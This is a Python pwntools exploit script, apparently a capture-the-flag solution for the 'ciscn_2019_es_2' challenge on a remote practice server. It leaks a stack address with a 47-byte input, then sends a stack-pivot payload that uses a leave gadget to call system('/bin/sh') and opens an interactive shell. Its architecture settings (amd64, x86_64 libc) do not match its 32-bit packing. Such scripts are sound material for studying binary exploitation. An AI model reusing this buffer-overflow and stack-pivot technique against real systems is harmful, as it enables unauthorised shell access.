#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './ciscn_2019_es_2'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_host  = 'node3.buuoj.cn'
remote_port = 29478

DEBUG = False 
# DEBUG = True

if DEBUG:
	p = process(local_file)
	libc = ELF(local_libc)
else: 
	p = remote(remote_host,remote_port)
	libc = ELF(remote_libc)
elf = ELF(local_file)

context.log_level = 'debug'
context.arch = 'amd64' # 'i386'

# gadget
leave = 0x80485fd     # mov esp, ebp; pop ebp; ret

# elf, libc
system = 0x08048559

# rop1
payload = 'A'*47
p.recvuntil("Welcome, my friend. What's your name?\n")
p.sendline(payload)

p.recvuntil('A'*47+'\n')
data = p.recv(8)
log.hexdump(data)

libc_func_x = u32(data[0:4])
stack = u32(data[4:8])

# 40:ebp

offset = 80
buf = stack - offset

log.info('buf = ' + hex(buf))

binsh = buf+12
ns  = p32(0xdeadbeef)  # ebp -> buf -> 0xdeadbeef
ns += p32(system) + p32(binsh) + '/bin/sh\0'
payload = ns.ljust(40,'\0') + p32(buf)
payload += p32(leave)

# gdb.attach(p)
p.sendline(payload)

# log.info('')
# log.warning('--------------')

p.interactive()

